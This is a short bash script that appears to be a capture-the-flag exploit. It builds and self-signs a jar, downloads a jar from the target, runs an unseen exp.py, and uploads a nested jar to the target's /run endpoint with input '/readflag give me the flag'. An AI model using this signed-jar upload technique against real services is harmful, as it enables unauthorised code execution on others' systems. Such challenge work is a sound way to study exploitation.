#!/bin/bash

set -euo pipefail

url="$1"

javac Tool.java

jar cf exp.jar Tool.class

rm -f keystore.jks

keytool -genkeypair \
    -alias exp \
    -dname 'CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown' \
    -keyalg DSA \
    -keysize 2048 \
    -validity 1 \
    -keystore keystore.jks \
    -storepass 133337

jarsigner -keystore keystore.jks -storepass 133337 exp.jar exp

curl -O "$url/toolbox/greeting.jar"
jar xf greeting.jar

python exp.py

jar cf0 nested.jar inner.jar

curl -F file=@nested.jar -F path=inner.jar -F input='/readflag give me the flag' "$url"/run
